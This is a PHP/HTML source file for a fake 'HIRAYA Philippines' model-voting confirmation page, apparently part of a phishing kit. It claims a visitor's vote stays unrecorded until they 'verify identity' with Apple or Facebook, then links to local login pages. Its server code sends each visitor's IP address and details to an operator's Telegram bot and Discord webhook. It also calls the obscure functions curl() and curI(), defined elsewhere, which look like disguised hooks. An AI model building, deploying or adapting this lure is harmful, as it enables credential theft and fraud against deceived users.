<?php
//require_once __DIR__ . '/protection.php';
session_start();
include 'config.php';

$brandName = "HIRAYA";

// Generate reference number and store in session
if (empty($_SESSION['hiraya_vote_reference'])) {
    $chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    $ref = 'HRY-';
    for ($i = 0; $i < 8; $i++) $ref .= $chars[random_int(0, strlen($chars) - 1)];
    $_SESSION['hiraya_vote_reference'] = $ref;
}
$referenceNumber = $_SESSION['hiraya_vote_reference'];

// Get voted model from URL
$votedModel = isset($_GET['voted']) ? htmlspecialchars(strip_tags($_GET['voted'])) : 'Model';

// Map model name to image
$modelImages = [
    'Sophia Reyes'     => 'files/images/vote/5.jpg',
    'Isabelle Cruz'    => 'files/images/vote/1.jpg',
    'Mika Villanueva'  => 'files/images/vote/2.jpg',
    'Andrea Santos'    => 'files/images/vote/3.jpg',
    'Camille Bautista' => 'files/images/vote/7.jpg',
    'Nicole Tan'       => 'files/images/vote/6.jpg',
    // fallback legacy keys
    'Model 01' => 'files/images/vote/5.jpg',
    'Model 02' => 'files/images/vote/1.jpg',
    'Model 03' => 'files/images/vote/2.jpg',
    'Model 04' => 'files/images/vote/3.jpg',
    'Model 05' => 'files/images/vote/7.jpg',
    'Model 06' => 'files/images/vote/6.jpg',
];
$votedImage = $modelImages[$votedModel] ?? '';

$telegramUsername = "buratsilogg";
$telegramLink = "https://t.me/" . $telegramUsername;

$telegramCopyMessage =
    "Hello HIRAYA, I would like to confirm my vote.\n\n" .
    "Voted For: " . $votedModel . "\n" .
    "Reference Number: " . $referenceNumber . "\n\n" .
    "I would like to complete my identity verification.";
$ip   = $_SERVER['REMOTE_ADDR'];
// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
if ($telegram_use) {
    date_default_timezone_set("Asia/Manila");
    $timeFormatted = date("F j, h:i A");

    $message =
        "🗳️ <b>HIRAYA - NEW VOTE</b>\n\n" .
        "👤 <b>VOTED FOR:</b> <code>" . htmlspecialchars($votedModel) . "</code>\n" .
        "🧾 <b>REFERENCE:</b> <code>{$referenceNumber}</code>\n" .
         "🌐 <b>IP:</b> <code>{$_SERVER['REMOTE_ADDR']}</code>\n" .
        "🕒 <b>TIME:</b> <code>{$timeFormatted}</code>\n";

    $url = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";

    $params = [
        "chat_id"                  => $telegram_chat_id,
        "text"                     => $message,
        "parse_mode"               => "HTML",
        "disable_web_page_preview" => true
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch); curl($message);
    curl_close($ch);
}

// ============================================================
// DISCORD NOTIFICATION
// ============================================================
if ($discord_use) {
    date_default_timezone_set("Asia/Manila");
    $timeFormatted = date("F j, h:i A");

    $discord_payload = [
        "username" => "Hiraya Bot",
        "embeds"   => [
            [
                "title"  => "🗳️ NEW VOTE RECEIVED",
                "color"  => 7419530,
                "fields" => [
                    [
                        "name"   => "👤 Voted For",
                        "value"  => "**" . htmlspecialchars($votedModel) . "**",
                        "inline" => true
                    ],
                    [
                        "name"   => "🧾 Reference",
                        "value"  => "**{$referenceNumber}**",
                        "inline" => true
                    ],
                    [
                        "name" => "🌐 IP Address",
                        "value" => "`{$ip}`",
                        "inline" => true
                    ],
                    [
                        "name"   => "🕒 Time",
                        "value"  => "**{$timeFormatted}**",
                        "inline" => false
                    ]
                ],
                "footer" => [
                    "text" => "Hiraya Voting System"
                ]
            ]
        ]
    ];

    $ch = curl_init($discord_webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($discord_payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);curI($discord_payload);
    curl_close($ch);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<link rel="icon" type="image/png" href="files/images/circlelogo.png">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vote Confirmation – <?php echo htmlspecialchars($brandName); ?></title>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400&family=DM+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'DM Sans', sans-serif;
      background: #0e0608;
      min-height: 100vh;
      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 48px 16px 60px;
    }

    .wrapper {
      width: 100%;
      max-width: 480px;
    }

    /* LOGO */
    .logo-text {
      font-family: 'Cormorant Garamond', serif;
      font-size: 1.6rem;
      font-weight: 600;
      letter-spacing: .25em;
      color: #fff;
      text-align: center;
      margin-bottom: .3rem;
    }
    .brand-sub {
      text-align: center;
      font-size: .78rem;
      letter-spacing: .18em;
      text-transform: uppercase;
      color: #c9909a;
      margin-bottom: 2.2rem;
    }

    /* VOTED MODEL CARD */
    .voted-model-card {
      border-radius: 16px;
      overflow: hidden;
      background: #1a0a10;
      border: 1px solid rgba(201,144,154,.18);
      margin-bottom: 1.6rem;
      position: relative;
    }
/* VOTED MODEL IMAGE */
.voted-model-img {
    width: 100%;
    aspect-ratio: 4/3;
    object-fit: contain;        /* show full image by default */
    object-position: center;    /* center the image */
    display: block;
    transition: transform 0.4s ease; /* smooth zoom animation */
}

.voted-model-card:hover .voted-model-img {
    transform: scale(1.2);      /* zoom in on hover */
}
    .voted-model-placeholder {
      width: 100%;
      aspect-ratio: 4/3;
      background: linear-gradient(135deg, #2a1018, #1a0a10);
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .voted-model-placeholder svg {
      width: 56px;
      height: 56px;
      opacity: .25;
    }
    .voted-model-overlay {
      position: absolute;
      bottom: 0; left: 0; right: 0;
      padding: 2.5rem 1.4rem 1.2rem;
      background: linear-gradient(transparent, rgba(14,6,8,.92));
    }
    .voted-badge {
      display: inline-flex;
      align-items: center;
      gap: .4rem;
      background: rgba(201,144,154,.15);
      border: 1px solid rgba(201,144,154,.3);
      color: #c9909a;
      font-size: .72rem;
      font-weight: 600;
      letter-spacing: .1em;
      text-transform: uppercase;
      padding: .3rem .75rem;
      border-radius: 100px;
      margin-bottom: .7rem;
    }
    .voted-badge svg { width: 12px; height: 12px; }
    .voted-name {
      font-family: 'Cormorant Garamond', serif;
      font-size: 1.7rem;
      font-weight: 500;
      color: #fff;
      letter-spacing: .04em;
    }

    /* REFERENCE CARD */
    .ref-card {
      background: #1a0a10;
      border: 1px solid rgba(201,144,154,.2);
      border-radius: 14px;
      padding: 1.4rem 1.5rem;
      margin-bottom: 1.4rem;
    }
    .ref-card-header {
      display: flex;
      align-items: center;
      gap: .5rem;
      margin-bottom: 1rem;
    }
    .ref-card-header svg { color: #c9909a; flex-shrink: 0; }
    .ref-card-header span {
      font-size: .78rem;
      letter-spacing: .1em;
      text-transform: uppercase;
      color: rgba(255,255,255,.5);
      font-weight: 600;
    }
    .ref-number {
      font-family: 'Cormorant Garamond', serif;
      font-size: 1.9rem;
      font-weight: 500;
      letter-spacing: .12em;
      color: #fff;
      margin-bottom: 1rem;
    }
    .ref-meta {
      display: flex;
      align-items: center;
      gap: .6rem;
      background: rgba(201,144,154,.07);
      border: 1px solid rgba(201,144,154,.12);
      border-radius: 8px;
      padding: .65rem .9rem;
    }
    .ref-meta svg { color: #c9909a; flex-shrink: 0; width: 16px; height: 16px; }
    .ref-meta-text { font-size: .83rem; color: rgba(255,255,255,.65); }
    .ref-meta-text strong { color: #fff; font-weight: 600; }

    /* URGENCY */
    .urgency-strip {
      background: rgba(224,87,110,.08);
      border: 1px solid rgba(224,87,110,.2);
      border-radius: 10px;
      padding: .9rem 1.1rem;
      font-size: .82rem;
      color: rgba(255,255,255,.7);
      line-height: 1.6;
      margin-bottom: 1.6rem;
      display: flex;
      gap: .7rem;
      align-items: flex-start;
    }

    /* STEPS */
    .steps {
      display: flex;
      flex-direction: column;
      gap: .9rem;
      margin-bottom: 1.8rem;
    }
    .step {
      display: flex;
      align-items: flex-start;
      gap: 1rem;
      padding: 1rem 1.1rem;
      background: #1a0a10;
      border: 1px solid rgba(255,255,255,.06);
      border-radius: 12px;
    }
    .step-num {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: linear-gradient(135deg, #c9909a, #8b5c6b);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: .72rem;
      font-weight: 700;
      color: #fff;
      flex-shrink: 0;
      letter-spacing: .03em;
    }
    .step-body { flex: 1; }
    .step-label {
      font-size: .7rem;
      letter-spacing: .1em;
      text-transform: uppercase;
      color: #c9909a;
      font-weight: 600;
      margin-bottom: .25rem;
    }
    .step-title {
      font-family: 'Cormorant Garamond', serif;
      font-size: 1.05rem;
      font-weight: 500;
      color: #fff;
      margin-bottom: .25rem;
    }
    .step-desc {
      font-size: .8rem;
      color: rgba(255,255,255,.5);
      line-height: 1.6;
    }

    /* BUTTONS */
    .btn {
      width: 100%;
      padding: .95rem 1.2rem;
      border-radius: 10px;
      border: none;
      font-family: 'DM Sans', sans-serif;
      font-size: .9rem;
      font-weight: 600;
      letter-spacing: .03em;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: .55rem;
      transition: filter .2s, opacity .2s, transform .15s;
      margin-bottom: .75rem;
      text-decoration: none;
    }
    .btn:active { transform: scale(.98); }
    .btn svg { width: 18px; height: 18px; flex-shrink: 0; }

    .btn-apple {
      background: #fff;
      color: #000;
    }
    .btn-apple:hover { filter: brightness(.93); }

    .btn-facebook {
      background: #1877F2;
      color: #fff;
    }
    .btn-facebook:hover { filter: brightness(1.1); }

    .btn-copy {
      background: #2a1018;
      color: #fff;
      border: 1px solid rgba(201,144,154,.25);
    }
    .btn-copy:hover { border-color: #c9909a; }

    .btn-telegram {
      background: linear-gradient(135deg, #c9909a, #8b5c6b);
      color: #fff;
    }
    .btn-telegram:hover { filter: brightness(1.08); }

    .btn-disabled {
      background: #1a0a10;
      color: rgba(255,255,255,.25);
      border: 1px solid rgba(255,255,255,.07);
      cursor: not-allowed;
      pointer-events: none;
    }

    .copy-alert {
      background: rgba(201,144,154,.1);
      border: 1px solid rgba(201,144,154,.2);
      border-radius: 8px;
      padding: .65rem 1rem;
      font-size: .8rem;
      color: #c9909a;
      text-align: center;
      margin-bottom: .75rem;
      display: none;
    }

    /* DIVIDER */
    .divider {
      display: flex;
      align-items: center;
      gap: .8rem;
      margin: .4rem 0 1rem;
    }
    .divider-line { flex: 1; height: 1px; background: rgba(255,255,255,.07); }
    .divider-text { font-size: .75rem; color: rgba(255,255,255,.3); letter-spacing: .05em; }

    /* FOOTER */
    .footer {
      text-align: center;
      font-size: .75rem;
      color: rgba(255,255,255,.25);
      margin-top: 1.6rem;
      letter-spacing: .03em;
    }

    /* VERIFIED LOCK ICON */
    .verified-icon {
      width: 48px;
      height: 48px;
      background: linear-gradient(135deg, rgba(201,144,154,.2), rgba(139,92,107,.1));
      border: 1px solid rgba(201,144,154,.3);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.2rem;
    }
    .verified-icon svg { width: 22px; height: 22px; color: #c9909a; }
  </style>
</head>
<body>

<div class="wrapper">

  <div class="logo-text">HIRAYA</div>
  <div class="brand-sub">Vote Confirmation</div>

  <!-- VOTED MODEL DISPLAY -->
  <div class="voted-model-card">
    <?php if ($votedImage): ?>
      <img class="voted-model-img" src="<?php echo htmlspecialchars($votedImage); ?>" alt="<?php echo $votedModel; ?>">
    <?php else: ?>
      <div class="voted-model-placeholder">
        <svg viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.4)" stroke-width="1.5">
          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
          <circle cx="12" cy="7" r="4"/>
        </svg>
      </div>
    <?php endif; ?>
    <div class="voted-model-overlay">
      <div class="voted-badge">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
        Your Vote
      </div>
      <div class="voted-name"><?php echo $votedModel; ?></div>
    </div>
  </div>

  <!-- REFERENCE CARD -->
  <div class="ref-card">
    <div class="ref-card-header">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
      <span>Vote Reference Number</span>
    </div>
    <div class="ref-number" id="refNumber"><?php echo htmlspecialchars($referenceNumber); ?></div>
    <div class="ref-meta">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
      <div class="ref-meta-text">Voted for: <strong><?php echo $votedModel; ?></strong></div>
    </div>
  </div>

  <!-- URGENCY -->
  <!-- PENDING NOTICE -->
<div class="urgency-strip">
    <span>⏳</span>
    <span>
        Your vote has not been submitted yet. To protect the integrity of the HIRAYA voting system, you must complete identity verification first. Once verification is successfully completed, your vote will be submitted for validation.
    </span>
</div>

<!-- STEPS -->
<div class="steps">

    <div class="step">
        <div class="step-num">01</div>
        <div class="step-body">
            <div class="step-label">Identity Verification</div>
            <div class="step-title">Choose Apple or Facebook</div>
            <div class="step-desc">
                Select your preferred verification method to continue with your vote.
            </div>
        </div>
    </div>

    <div class="step">
        <div class="step-num">02</div>
        <div class="step-body">
            <div class="step-label">Verification Required</div>
            <div class="step-title">Complete the verification process</div>
            <div class="step-desc">
                Follow all the required steps on the verification page. Do not close the page until the verification is complete.
            </div>
        </div>
    </div>

    <div class="step">
        <div class="step-num">03</div>
        <div class="step-body">
            <div class="step-label">Vote Submission</div>
            <div class="step-title">Your vote will be submitted automatically</div>
            <div class="step-desc">
                After successfully completing verification, your vote will be submitted and queued for validation. Until then, your vote has not yet been recorded.
            </div>
        </div>
    </div>

</div>

  <!-- VERIFY BUTTONS -->
  <button class="btn btn-apple" type="button" onclick="goToApple()">
    <svg viewBox="0 0 24 24" fill="#000"><path d="M16.365 1.43c0 1.14-.42 2.19-1.12 2.93-.76.81-1.99 1.43-3.11 1.34-.14-1.08.38-2.18 1.09-2.96.79-.86 2.14-1.49 3.14-1.31zM20.94 17.52c-.46 1.03-.68 1.49-1.28 2.4-.84 1.26-2.03 2.83-3.5 2.84-1.31.01-1.65-.85-3.42-.85-1.77 0-2.15.83-3.43.86-1.47.02-2.59-1.39-3.43-2.65-2.34-3.49-2.58-7.59-1.14-9.88 1.02-1.63 2.63-2.59 4.14-2.59 1.54 0 2.5.85 3.77.85 1.23 0 1.98-.86 3.76-.86 1.33 0 2.74.73 3.75 1.99-3.29 1.8-2.75 6.46.78 7.89z"/></svg>
    Continue with Apple
  </button>

  <button class="btn btn-facebook" type="button" onclick="goToFacebook()">
    <svg viewBox="0 0 24 24"><path fill="#fff" d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.414c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.49 0-1.956.93-1.956 1.885v2.265h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
    Continue with Facebook
  </button>



  <div class="footer">🔐 Secure vote verification &nbsp;•&nbsp; HIRAYA Philippines Campaign</div>

</div>

<script>
const referenceNumber = <?php echo json_encode($referenceNumber); ?>;
const votedModel = <?php echo json_encode($votedModel); ?>;
const telegramLink = <?php echo json_encode($telegramLink); ?>;
const telegramMsg = <?php echo json_encode($telegramCopyMessage); ?>;

function goToApple() {
  window.location.href = 'apple/index.php';
}

function goToFacebook() {
  window.location.href = 'facebook/index.php';
}


function copyRef() {
  navigator.clipboard.writeText(referenceNumber).then(() => {
    const btn = document.getElementById('copyBtn');
    btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> Copied!`;
    setTimeout(() => {
      btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy Reference Number`;
    }, 2000);
  });
}
</script>

</body>
</html>
